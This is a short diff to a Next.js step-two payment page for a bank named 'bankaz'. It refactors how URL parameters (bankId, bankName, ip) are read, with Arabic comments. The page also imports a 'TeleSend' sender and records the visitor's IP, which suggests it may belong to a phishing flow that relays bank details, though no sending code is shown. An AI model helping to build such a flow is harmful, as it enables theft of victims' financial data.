@@ -1,13 +1,14 @@
+// app/payment/banks/bankaz/step2/page.jsx
 'use client'
 
-import { useRouter, useSearchParams } from 'next/navigation';
+import { useRouter } from 'next/navigation';
 import Image from "next/image";
 import { useState, useEffect, useRef } from 'react';
 import TeleSned from "../../../../../server/TeleSend";
 
-export default function Page() {
+// استقبل searchParams كـ prop بدلاً من useSearchParams()
+export default function Page({ searchParams }) {
     const router = useRouter();
-    const searchParams = useSearchParams();
     const { Send } = TeleSned();
     const [isLoading, setIsLoading] = useState(false);
     const [userIp, setUserIp] = useState('جاري التحميل...');
@@ -20,10 +21,10 @@ export default function Page() {
     const containerRef = useRef(null);
     const buttonRef = useRef(null);
     
-    // الحصول على البارامترات من URL
-    const bankId = searchParams.get('bankId');
-    const bankNameFromUrl = searchParams.get('bankName');
-    const ipFromUrl = searchParams.get('ip');
+    // الحصول على البارامترات من searchParams prop
+    const bankId = searchParams?.bankId || null;
+    const bankNameFromUrl = searchParams?.bankName || null;
+    const ipFromUrl = searchParams?.ip || null;
 
     // جلب IP من API إذا لم يكن موجود في URL
     useEffect(() => {
